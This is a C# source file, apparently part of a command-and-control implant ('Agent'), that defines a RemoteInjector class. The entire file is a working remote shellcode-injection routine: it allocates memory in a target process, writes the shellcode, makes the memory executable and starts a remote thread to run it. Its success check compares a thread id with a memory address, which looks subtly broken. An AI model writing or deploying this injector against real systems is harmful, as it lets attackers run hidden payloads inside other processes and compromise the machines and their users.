using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Native;

namespace Agent.Internal
{
    public class RemoteInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            var proc = Process.GetProcessById(pid);
            var baseAddr = Native.Kernel32.VirtualAllocEx(proc.Handle, IntPtr.Zero, shellcode.Length,
                Kernel32.AllocationType.Commit | Kernel32.AllocationType.Reserve, Kernel32.MemoryProtection.ReadWrite);
            Native.Kernel32.WriteProcessMemory(proc.Handle, baseAddr, shellcode, shellcode.Length, out var _);
            Native.Kernel32.VirtualProtectEx(proc.Handle, baseAddr, shellcode.Length,
                Kernel32.MemoryProtection.ExecuteRead, out var old);
            Native.Kernel32.CreateRemoteThread(proc.Handle, IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, out var tid);
            if (tid != baseAddr)
                return true;
            return false;

        }
    }
}
